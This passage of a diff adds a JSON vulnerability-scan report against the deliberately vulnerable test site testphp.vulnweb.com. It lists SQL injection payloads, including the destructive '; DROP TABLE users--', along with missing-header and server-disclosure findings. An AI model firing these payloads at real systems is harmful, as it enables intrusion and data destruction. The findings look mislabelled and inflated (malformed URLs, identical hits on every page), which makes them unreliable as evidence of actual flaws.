+    },
+    {
+      "payload": "' OR 1=1 LIMIT 1--",
+      "severity": "High",
+      "type": "SQL Injection (Time-Based)",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php?test=' OR 1=1 LIMIT 1--"
+    },
+    {
+      "payload": "' AND 1=0 UNION SELECT NULL--",
+      "severity": "High",
+      "type": "SQL Injection (Time-Based)",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php?test=' AND 1=0 UNION SELECT NULL--"
+    },
+    {
+      "error": "Failed to fetch URL: ('Connection aborted.', ConnectionResetError(10054, 'An existing connection was forcibly closed by the remote host', None, 10054, None))"
+    },
+    {
+      "payload": "\" OR \"1\"=\"1",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test=\" OR \"1\"=\"1"
+    },
+    {
+      "payload": "' OR 1=1/*",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test=' OR 1=1/*"
+    },
+    {
+      "payload": "' AND 1=0 UNION SELECT NULL--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test=' AND 1=0 UNION SELECT NULL--"
+    },
+    {
+      "payload": "' OR 1=1 LIMIT 1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test=' OR 1=1 LIMIT 1--"
+    },
+    {
+      "payload": "' AND SLEEP(3)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test=' AND SLEEP(3)--"
+    },
+    {
+      "payload": "' OR 'a'='a",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test=' OR 'a'='a"
+    },
+    {
+      "payload": "' OR '1'='1' -- ",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test=' OR '1'='1' -- "
+    },
+    {
+      "payload": "' OR 1=1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test=' OR 1=1--"
+    },
+    {
+      "payload": "' OR 1=1#",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test=' OR 1=1#"
+    },
+    {
+      "payload": "'; DROP TABLE users--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test='; DROP TABLE users--"
+    },
+    {
+      "payload": "' OR EXISTS(SELECT * FROM users)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test=' OR EXISTS(SELECT * FROM users)--"
+    },
+    {
+      "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/?test=' OR (SELECT COUNT(*) FROM users) > 0--"
+    }
+  ],
+  "target": "http://testphp.vulnweb.com",
+  "total_vulnerabilities": 233,
+  "unique_vulnerabilities": 13,
+  "vulnerability_analysis": {
+    "affected_urls_per_vuln": {
+      "information disclosure|server header reveals server information": [
+        "http://testphp.vulnweb.com/search.php?test=query",
+        "http://testphp.vulnweb.com/index.php",
+        "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+        "http://testphp.vulnweb.com/artists.php",
+        "http://testphp.vulnweb.com/login.php",
+        "http://testphp.vulnweb.com/guestbook.php",
+        "http://testphp.vulnweb.com/hpp",
+        "http://testphp.vulnweb.com/cart.php",
+        "http://testphp.vulnweb.com/categories.php",
+        "http://testphp.vulnweb.com/AJAX/index.php"
+      ],
+      "information disclosure|x-powered-by header reveals server information": [
+        "http://testphp.vulnweb.com/search.php?test=query",
+        "http://testphp.vulnweb.com/index.php",
+        "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+        "http://testphp.vulnweb.com/artists.php",
+        "http://testphp.vulnweb.com/login.php",
+        "http://testphp.vulnweb.com/guestbook.php",
+        "http://testphp.vulnweb.com/hpp",
+        "http://testphp.vulnweb.com/cart.php",
+        "http://testphp.vulnweb.com/categories.php",
+        "http://testphp.vulnweb.com/AJAX/index.php"
+      ],
+      "missing security header|controls how much referrer info is shared": [
+        "http://testphp.vulnweb.com/search.php?test=query",
+        "http://testphp.vulnweb.com/index.php",
+        "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+        "http://testphp.vulnweb.com/artists.php",
+        "http://testphp.vulnweb.com/login.php",
+        "http://testphp.vulnweb.com/guestbook.php",
+        "http://testphp.vulnweb.com/hpp",
+        "http://testphp.vulnweb.com/cart.php",
+        "http://testphp.vulnweb.com/categories.php",
+        "http://testphp.vulnweb.com/AJAX/index.php"
+      ],
+      "missing security header|cross-domain policy control": [
+        "http://testphp.vulnweb.com/search.php?test=query",
+        "http://testphp.vulnweb.com/index.php",
+        "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+        "http://testphp.vulnweb.com/artists.php",
+        "http://testphp.vulnweb.com/login.php",
+        "http://testphp.vulnweb.com/guestbook.php",
+        "http://testphp.vulnweb.com/hpp",
+        "http://testphp.vulnweb.com/cart.php",
+        "http://testphp.vulnweb.com/categories.php",
+        "http://testphp.vulnweb.com/AJAX/index.php"
+      ],
+      "missing security header|enforces https": [
+        "http://testphp.vulnweb.com/search.php?test=query",
+        "http://testphp.vulnweb.com/index.php",
+        "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+        "http://testphp.vulnweb.com/artists.php",
+        "http://testphp.vulnweb.com/login.php",
+        "http://testphp.vulnweb.com/guestbook.php",
+        "http://testphp.vulnweb.com/hpp",
+        "http://testphp.vulnweb.com/cart.php",
+        "http://testphp.vulnweb.com/categories.php",
+        "http://testphp.vulnweb.com/AJAX/index.php"
+      ],
+      "missing security header|prevents mime-type sniffing": [
+        "http://testphp.vulnweb.com/search.php?test=query",
+        "http://testphp.vulnweb.com/index.php",
+        "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+        "http://testphp.vulnweb.com/artists.php",
+        "http://testphp.vulnweb.com/login.php",
+        "http://testphp.vulnweb.com/guestbook.php",
+        "http://testphp.vulnweb.com/hpp",
+        "http://testphp.vulnweb.com/cart.php",
+        "http://testphp.vulnweb.com/categories.php",
+        "http://testphp.vulnweb.com/AJAX/index.php"
+      ],
+      "missing security header|prevents xss attacks": [
+        "http://testphp.vulnweb.com/search.php?test=query",
+        "http://testphp.vulnweb.com/index.php",
+        "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+        "http://testphp.vulnweb.com/artists.php",
+        "http://testphp.vulnweb.com/login.php",
+        "http://testphp.vulnweb.com/guestbook.php",
+        "http://testphp.vulnweb.com/hpp",
+        "http://testphp.vulnweb.com/cart.php",
+        "http://testphp.vulnweb.com/categories.php",
+        "http://testphp.vulnweb.com/AJAX/index.php"
+      ],
+      "missing security header|protects against clickjacking": [
+        "http://testphp.vulnweb.com/search.php?test=query",
+        "http://testphp.vulnweb.com/index.php",
+        "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+        "http://testphp.vulnweb.com/artists.php",
+        "http://testphp.vulnweb.com/login.php",
+        "http://testphp.vulnweb.com/guestbook.php",
+        "http://testphp.vulnweb.com/hpp",
+        "http://testphp.vulnweb.com/cart.php",
+        "http://testphp.vulnweb.com/categories.php",
+        "http://testphp.vulnweb.com/AJAX/index.php"
+      ],
+      "missing security header|xss protection": [
+        "http://testphp.vulnweb.com/search.php?test=query",
+        "http://testphp.vulnweb.com/index.php",
+        "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+        "http://testphp.vulnweb.com/artists.php",
+        "http://testphp.vulnweb.com/login.php",
+        "http://testphp.vulnweb.com/guestbook.php",
+        "http://testphp.vulnweb.com/hpp",
+        "http://testphp.vulnweb.com/cart.php",
+        "http://testphp.vulnweb.com/categories.php",
+        "http://testphp.vulnweb.com/AJAX/index.php"
+      ],
+      "reflected xss (post)|": [
+        "http://testphp.vulnweb.com/search.php?test=query"
+      ],
+      "sql injection (error-based)|": [
+        "http://testphp.vulnweb.com/login.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+        "http://testphp.vulnweb.com/artists.php?test=' OR 'a'='a",
+        "http://testphp.vulnweb.com/cart.php?test=\" OR \"1\"=\"1",
+        "http://testphp.vulnweb.com/index.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+        "http://testphp.vulnweb.com/index.php?test=' OR 1=1#",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=\" OR \"1\"=\"1",
+        "http://testphp.vulnweb.com/login.php?test=' OR 1=1/*",
+        "http://testphp.vulnweb.com/search.php?test=query?test=\" OR \"1\"=\"1",
+        "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1/*",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+        "http://testphp.vulnweb.com/cart.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test='; DROP TABLE users--",
+        "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1#",
+        "http://testphp.vulnweb.com/index.php?test=' OR 1=1/*",
+        "http://testphp.vulnweb.com/?test=' OR EXISTS(SELECT * FROM users)--",
+        "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1#",
+        "http://testphp.vulnweb.com/cart.php?test='; DROP TABLE users--",
+        "http://testphp.vulnweb.com/login.php?test=' OR '1'='1' -- ",
+        "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1#",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 'a'='a",
+        "http://testphp.vulnweb.com/index.php?test='; DROP TABLE users--",
+        "http://testphp.vulnweb.com/login.php?test=' OR 'a'='a",
+        "http://testphp.vulnweb.com/cart.php?test=' AND 1=0 UNION SELECT NULL--",
+        "http://testphp.vulnweb.com/search.php?test=query?test=' AND 1=0 UNION SELECT NULL--",
+        "http://testphp.vulnweb.com/cart.php?test=' AND SLEEP(3)--",
+        "http://testphp.vulnweb.com/categories.php?test=' AND 1=0 UNION SELECT NULL--",
+        "http://testphp.vulnweb.com/artists.php?test=' OR 1=1/*",
+        "http://testphp.vulnweb.com/artists.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+        "http://testphp.vulnweb.com/index.php?test=' OR EXISTS(SELECT * FROM users)--",
+        "http://testphp.vulnweb.com/cart.php?test=' OR EXISTS(SELECT * FROM users)--",
+        "http://testphp.vulnweb.com/?test=' OR 1=1/*",
+        "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1 LIMIT 1--",
+        "http://testphp.vulnweb.com/search.php?test=query?test=' OR 'a'='a",
+        "http://testphp.vulnweb.com/artists.php?test=' AND SLEEP(3)--",
+        "http://testphp.vulnweb.com/?test=' OR 1=1#",
+        "http://testphp.vulnweb.com/categories.php?test=' AND SLEEP(3)--",
+        "http://testphp.vulnweb.com/login.php?test=' OR EXISTS(SELECT * FROM users)--",
+        "http://testphp.vulnweb.com/login.php?test=' AND 1=0 UNION SELECT NULL--",
+        "http://testphp.vulnweb.com/disclaimer.php?test=' AND SLEEP(3)--",
+        "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1 LIMIT 1--",
+        "http://testphp.vulnweb.com/artists.php?test='; DROP TABLE users--",
+        "http://testphp.vulnweb.com/search.php?test=query?test=' OR EXISTS(SELECT * FROM users)--",
+        "http://testphp.vulnweb.com/index.php?test=' OR 1=1 LIMIT 1--",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' AND 1=0 UNION SELECT NULL--",
+        "http://testphp.vulnweb.com/guestbook.php?test=' OR 'a'='a",
+        "http://testphp.vulnweb.com/index.php?test=' OR 'a'='a",
+        "http://testphp.vulnweb.com/index.php?test=' AND SLEEP(3)--",
+        "http://testphp.vulnweb.com/disclaimer.php?test=\" OR \"1\"=\"1",
+        "http://testphp.vulnweb.com/cart.php?test=' OR 1=1/*",
+        "http://testphp.vulnweb.com/?test=\" OR \"1\"=\"1",
+        "http://testphp.vulnweb.com/?test=' OR 'a'='a",
+        "http://testphp.vulnweb.com/guestbook.php?test=' AND 1=0 UNION SELECT NULL--",
+        "http://testphp.vulnweb.com/guestbook.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+        "http://testphp.vulnweb.com/?test='; DROP TABLE users--",
+        "http://testphp.vulnweb.com/guestbook.php?test=\" OR \"1\"=\"1",
+        "http://testphp.vulnweb.com/search.php?test=query?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+        "http://testphp.vulnweb.com/disclaimer.php?test=' OR 'a'='a",
+        "http://testphp.vulnweb.com/artists.php?test=' OR '1'='1' -- ",
+        "http://testphp.vulnweb.com/cart.php?test=' OR 1=1 LIMIT 1--",
+        "http://testphp.vulnweb.com/login.php?test=' OR 1=1#",
+        "http://testphp.vulnweb.com/categories.php?test=' OR EXISTS(SELECT * FROM users)--",
+        "http://testphp.vulnweb.com/index.php?test=\" OR \"1\"=\"1",
+        "http://testphp.vulnweb.com/disclaimer.php?test='; DROP TABLE users--",
+        "http://testphp.vulnweb.com/disclaimer.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+        "http://testphp.vulnweb.com/categories.php?test='; DROP TABLE users--",
+        "http://testphp.vulnweb.com/login.php?test=' OR 1=1--",
+        "http://testphp.vulnweb.com/?test=' OR 1=1 LIMIT 1--",
+        "http://testphp.vulnweb.com/?test=' AND SLEEP(3)--",
+        "http://testphp.vulnweb.com/search.php?test=query?test=' OR '1'='1' -- ",
+        "http://testphp.vulnweb.com/categories.php?test=' OR 1=1--",
+        "http://testphp.vulnweb.com/?test=' OR 1=1--",
+        "http://testphp.vulnweb.com/categories.php?test=' OR 1=1#",
+        "http://testphp.vulnweb.com/disclaimer.php?test=' OR EXISTS(SELECT * FROM users)--",
+        "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1--",
+        "http://testphp.vulnweb.com/login.php?test=' AND SLEEP(3)--",
+        "http://testphp.vulnweb.com/artists.php?test=' OR 1=1 LIMIT 1--",
+        "http://testphp.vulnweb.com/categories.php?test=' OR 1=1 LIMIT 1--",
+        "http://testphp.vulnweb.com/categories.php?test=' OR 1=1/*",
+        "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1/*",
+        "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1/*",
+        "http://testphp.vulnweb.com/index.php?test=' OR 1=1--",
+        "http://testphp.vulnweb.com/login.php?test='; DROP TABLE users--",
+        "http://testphp.vulnweb.com/login.php?test=\" OR \"1\"=\"1",
+        "http://testphp.vulnweb.com/categories.php?test=\" OR \"1\"=\"1",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1/*",
+        "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1--",
+        "http://testphp.vulnweb.com/?test=' AND 1=0 UNION SELECT NULL--",
+        "http://testphp.vulnweb.com/categories.php?test=' OR 'a'='a",
+        "http://testphp.vulnweb.com/guestbook.php?test=' AND SLEEP(3)--",
+        "http://testphp.vulnweb.com/login.php?test=' OR 1=1 LIMIT 1--",
+        "http://testphp.vulnweb.com/artists.php?test=' OR 1=1#",
+        "http://testphp.vulnweb.com/artists.php?test=' OR 1=1--",
+        "http://testphp.vulnweb.com/cart.php?test=' OR 1=1--",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' AND SLEEP(3)--",
+        "http://testphp.vulnweb.com/categories.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+        "http://testphp.vulnweb.com/disclaimer.php?test=' OR '1'='1' -- ",
+        "http://testphp.vulnweb.com/guestbook.php?test='; DROP TABLE users--",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR EXISTS(SELECT * FROM users)--",
+        "http://testphp.vulnweb.com/index.php?test=' AND 1=0 UNION SELECT NULL--",
+        "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1 LIMIT 1--",
+        "http://testphp.vulnweb.com/index.php?test=' OR '1'='1' -- ",
+        "http://testphp.vulnweb.com/guestbook.php?test=' OR EXISTS(SELECT * FROM users)--",
+        "http://testphp.vulnweb.com/cart.php?test=' OR '1'='1' -- ",
+        "http://testphp.vulnweb.com/disclaimer.php?test=' AND 1=0 UNION SELECT NULL--",
+        "http://testphp.vulnweb.com/cart.php?test=' OR 'a'='a",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1#",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR '1'='1' -- ",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1 LIMIT 1--",
+        "http://testphp.vulnweb.com/guestbook.php?test=' OR '1'='1' -- ",
+        "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1--",
+        "http://testphp.vulnweb.com/artists.php?test=\" OR \"1\"=\"1",
+        "http://testphp.vulnweb.com/search.php?test=query?test=' AND SLEEP(3)--",
+        "http://testphp.vulnweb.com/?test=' OR '1'='1' -- ",
+        "http://testphp.vulnweb.com/artists.php?test=' AND 1=0 UNION SELECT NULL--",
+        "http://testphp.vulnweb.com/?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+        "http://testphp.vulnweb.com/search.php?test=query?test='; DROP TABLE users--",
+        "http://testphp.vulnweb.com/artists.php?test=' OR EXISTS(SELECT * FROM users)--",
+        "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1--",
+        "http://testphp.vulnweb.com/categories.php?test=' OR '1'='1' -- ",
+        "http://testphp.vulnweb.com/cart.php?test=' OR 1=1#"
+      ],
+      "sql injection (time-based)|": [
+        "http://testphp.vulnweb.com/AJAX/index.php?test=' OR 1=1 LIMIT 1--",
+        "http://testphp.vulnweb.com/AJAX/index.php?test=' AND 1=0 UNION SELECT NULL--"
+      ],
+      "|": [
+        "Unknown URL"
+      ]
+    },
+    "total_count": 233,
+    "total_severity_counts": {
+      "High": 132,
+      "Low": 22,
+      "Medium": 77,
+      "Unknown": 2
+    },
+    "unique_count": 13,
+    "unique_results": [
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/search.php?test=query",
+          "http://testphp.vulnweb.com/index.php",
+          "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+          "http://testphp.vulnweb.com/artists.php",
+          "http://testphp.vulnweb.com/login.php",
+          "http://testphp.vulnweb.com/guestbook.php",
+          "http://testphp.vulnweb.com/hpp",
+          "http://testphp.vulnweb.com/cart.php",
+          "http://testphp.vulnweb.com/categories.php",
+          "http://testphp.vulnweb.com/AJAX/index.php"
+        ],
+        "affected_urls_count": 11,
+        "description": "Prevents XSS attacks",
+        "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+        "header": "Content-Security-Policy",
+        "location": "HTTP Response Headers",
+        "payload": "Missing: Content-Security-Policy",
+        "severity": "Medium",
+        "type": "Missing Security Header",
+        "url": "http://testphp.vulnweb.com/search.php?test=query"
+      },
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/search.php?test=query",
+          "http://testphp.vulnweb.com/index.php",
+          "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+          "http://testphp.vulnweb.com/artists.php",
+          "http://testphp.vulnweb.com/login.php",
+          "http://testphp.vulnweb.com/guestbook.php",
+          "http://testphp.vulnweb.com/hpp",
+          "http://testphp.vulnweb.com/cart.php",
+          "http://testphp.vulnweb.com/categories.php",
+          "http://testphp.vulnweb.com/AJAX/index.php"
+        ],
+        "affected_urls_count": 11,
+        "description": "Prevents MIME-type sniffing",
+        "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+        "header": "X-Content-Type-Options",
+        "location": "HTTP Response Headers",
+        "payload": "Missing: X-Content-Type-Options",
+        "severity": "Medium",
+        "type": "Missing Security Header",
+        "url": "http://testphp.vulnweb.com/search.php?test=query"
+      },
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/search.php?test=query",
+          "http://testphp.vulnweb.com/index.php",
+          "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+          "http://testphp.vulnweb.com/artists.php",
+          "http://testphp.vulnweb.com/login.php",
+          "http://testphp.vulnweb.com/guestbook.php",
+          "http://testphp.vulnweb.com/hpp",
+          "http://testphp.vulnweb.com/cart.php",
+          "http://testphp.vulnweb.com/categories.php",
+          "http://testphp.vulnweb.com/AJAX/index.php"
+        ],
+        "affected_urls_count": 11,
+        "description": "Protects against clickjacking",
+        "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+        "header": "X-Frame-Options",
+        "location": "HTTP Response Headers",
+        "payload": "Missing: X-Frame-Options",
+        "severity": "Medium",
+        "type": "Missing Security Header",
+        "url": "http://testphp.vulnweb.com/search.php?test=query"
+      },
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/search.php?test=query",
+          "http://testphp.vulnweb.com/index.php",
+          "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+          "http://testphp.vulnweb.com/artists.php",
+          "http://testphp.vulnweb.com/login.php",
+          "http://testphp.vulnweb.com/guestbook.php",
+          "http://testphp.vulnweb.com/hpp",
+          "http://testphp.vulnweb.com/cart.php",
+          "http://testphp.vulnweb.com/categories.php",
+          "http://testphp.vulnweb.com/AJAX/index.php"
+        ],
+        "affected_urls_count": 11,
+        "description": "Enforces HTTPS",
+        "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+        "header": "Strict-Transport-Security",
+        "location": "HTTP Response Headers",
+        "payload": "Missing: Strict-Transport-Security",
+        "severity": "Medium",
+        "type": "Missing Security Header",
+        "url": "http://testphp.vulnweb.com/search.php?test=query"
+      },
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/search.php?test=query",
+          "http://testphp.vulnweb.com/index.php",
+          "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+          "http://testphp.vulnweb.com/artists.php",
+          "http://testphp.vulnweb.com/login.php",
+          "http://testphp.vulnweb.com/guestbook.php",
+          "http://testphp.vulnweb.com/hpp",
+          "http://testphp.vulnweb.com/cart.php",
+          "http://testphp.vulnweb.com/categories.php",
+          "http://testphp.vulnweb.com/AJAX/index.php"
+        ],
+        "affected_urls_count": 11,
+        "description": "Controls how much referrer info is shared",
+        "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+        "header": "Referrer-Policy",
+        "location": "HTTP Response Headers",
+        "payload": "Missing: Referrer-Policy",
+        "severity": "Medium",
+        "type": "Missing Security Header",
+        "url": "http://testphp.vulnweb.com/search.php?test=query"
+      },
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/search.php?test=query",
+          "http://testphp.vulnweb.com/index.php",
+          "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+          "http://testphp.vulnweb.com/artists.php",
+          "http://testphp.vulnweb.com/login.php",
+          "http://testphp.vulnweb.com/guestbook.php",
+          "http://testphp.vulnweb.com/hpp",
+          "http://testphp.vulnweb.com/cart.php",
+          "http://testphp.vulnweb.com/categories.php",
+          "http://testphp.vulnweb.com/AJAX/index.php"
+        ],
+        "affected_urls_count": 11,
+        "description": "Cross-domain policy control",
+        "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+        "header": "X-Permitted-Cross-Domain-Policies",
+        "location": "HTTP Response Headers",
+        "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+        "severity": "Medium",
+        "type": "Missing Security Header",
+        "url": "http://testphp.vulnweb.com/search.php?test=query"
+      },
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/search.php?test=query",
+          "http://testphp.vulnweb.com/index.php",
+          "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+          "http://testphp.vulnweb.com/artists.php",
+          "http://testphp.vulnweb.com/login.php",
+          "http://testphp.vulnweb.com/guestbook.php",
+          "http://testphp.vulnweb.com/hpp",
+          "http://testphp.vulnweb.com/cart.php",
+          "http://testphp.vulnweb.com/categories.php",
+          "http://testphp.vulnweb.com/AJAX/index.php"
+        ],
+        "affected_urls_count": 11,
+        "description": "XSS protection",
+        "evidence": "X-XSS-Protection header not present - XSS protection",
+        "header": "X-XSS-Protection",
+        "location": "HTTP Response Headers",
+        "payload": "Missing: X-XSS-Protection",
+        "severity": "Medium",
+        "type": "Missing Security Header",
+        "url": "http://testphp.vulnweb.com/search.php?test=query"
+      },
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/search.php?test=query",
+          "http://testphp.vulnweb.com/index.php",
+          "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+          "http://testphp.vulnweb.com/artists.php",
+          "http://testphp.vulnweb.com/login.php",
+          "http://testphp.vulnweb.com/guestbook.php",
+          "http://testphp.vulnweb.com/hpp",
+          "http://testphp.vulnweb.com/cart.php",
+          "http://testphp.vulnweb.com/categories.php",
+          "http://testphp.vulnweb.com/AJAX/index.php"
+        ],
+        "affected_urls_count": 11,
+        "description": "Server header reveals server information",
+        "evidence": "Server header reveals server information",
+        "header": "Server",
+        "location": "Server header",
+        "payload": "Server: nginx/1.19.0",
+        "severity": "Low",
+        "type": "Information Disclosure",
+        "url": "http://testphp.vulnweb.com/search.php?test=query"
+      },
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/search.php?test=query",
+          "http://testphp.vulnweb.com/index.php",
+          "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+          "http://testphp.vulnweb.com/artists.php",
+          "http://testphp.vulnweb.com/login.php",
+          "http://testphp.vulnweb.com/guestbook.php",
+          "http://testphp.vulnweb.com/hpp",
+          "http://testphp.vulnweb.com/cart.php",
+          "http://testphp.vulnweb.com/categories.php",
+          "http://testphp.vulnweb.com/AJAX/index.php"
+        ],
+        "affected_urls_count": 11,
+        "description": "X-Powered-By header reveals server information",
+        "evidence": "X-Powered-By header reveals server information",
+        "header": "X-Powered-By",
+        "location": "X-Powered-By header",
+        "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+        "severity": "Low",
+        "type": "Information Disclosure",
+        "url": "http://testphp.vulnweb.com/search.php?test=query"
+      },
+      {
+        "affected_urls": [
+          "http://testphp.vulnweb.com/login.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+          "http://testphp.vulnweb.com/artists.php?test=' OR 'a'='a",
+          "http://testphp.vulnweb.com/cart.php?test=\" OR \"1\"=\"1",
+          "http://testphp.vulnweb.com/index.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+          "http://testphp.vulnweb.com/index.php?test=' OR 1=1#",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=\" OR \"1\"=\"1",
+          "http://testphp.vulnweb.com/login.php?test=' OR 1=1/*",
+          "http://testphp.vulnweb.com/search.php?test=query?test=\" OR \"1\"=\"1",
+          "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1/*",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+          "http://testphp.vulnweb.com/cart.php?test=' OR (SELECT COUNT(*) FROM users) > 0--",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test='; DROP TABLE users--",
+          "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1#",
+          "http://testphp.vulnweb.com/index.php?test=' OR 1=1/*",
+          "http://testphp.vulnweb.com/?test=' OR EXISTS(SELECT * FROM users)--",
+          "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1#",
+          "http://testphp.vulnweb.com/cart.php?test='; DROP TABLE users--",
+          "http://testphp.vulnweb.com/login.php?test=' OR '1'='1' -- ",
+          "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1#",
+          "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 'a'='a",
+          "http://testphp.vulnweb.com/index.php?test='; DROP TABLE users--",
+          "http://testphp.vulnweb.com/login.php?test=' OR 'a'='a",
+          "http://testphp.vulnweb.com/cart.php?test=' AND 1=0 UNION SELECT NULL--",
+          "http://testphp.vulnweb.com/search.php?test=query?test=' AND 1=0 UNION SELECT NULL--",
+          "http://testphp.vulnweb.com/cart.php?test=' AND SLEEP(3)--",
